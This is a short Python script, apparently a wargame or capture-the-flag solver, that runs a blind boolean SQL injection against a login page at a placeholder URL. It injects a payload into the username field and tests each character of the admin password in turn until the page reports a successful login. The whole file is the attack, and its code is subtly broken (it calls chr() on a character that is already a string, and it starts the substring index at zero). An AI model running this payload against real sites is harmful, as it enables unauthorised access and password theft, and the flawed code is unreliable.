#!/usr/bin/python3
import requests
import string
url = 'http://example.com/login' # example URL
params = {
    'uid': '',
    'upw': ''
}
tc = string.ascii_letters + string.digits + string.punctuation # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~
query = '''
admin' and ascii(substr(upw,{idx},1))={val}--
'''
password = ''
for idx in range(0, 20):
    for ch in tc:
        params['uid'] = query.format(idx=idx, val=ord(ch)).strip("\n")
        c = requests.get(url, params=params)
        print(c.request.url)
        if c.text.find("Login success") != -1:
            password += chr(ch)
            break
print(f"Password is {password}")